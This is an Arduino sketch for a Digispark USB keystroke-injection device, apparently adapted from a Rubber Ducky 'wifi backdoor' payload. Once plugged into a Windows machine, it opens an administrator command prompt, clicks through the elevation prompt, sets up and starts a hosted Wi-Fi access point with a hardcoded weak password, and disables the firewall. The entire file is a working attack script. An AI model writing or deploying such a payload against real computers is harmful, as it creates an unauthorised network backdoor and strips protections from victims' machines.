#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT); //LED
}

void loop() {
  //Just a port from https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---wifi-backdoor, with some things changed
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
  DigiKeyboard.delay(400);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT); //opens cmd as administrator
  DigiKeyboard.delay(2500);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("netsh wlan set hostednetwork mode=allow ssid=noobcake key=123456789"); //The AP ssid is noobcake and the password is 123456789. Change this if you want to
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(900);
  DigiKeyboard.print("netsh wlan start hostednetwork");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(900);
  DigiKeyboard.print("netsh firewall set opmode disable");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(900);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digitalWrite(1, HIGH); //turns on led when script has finished
  for(;;){ /*empty*/ }
}
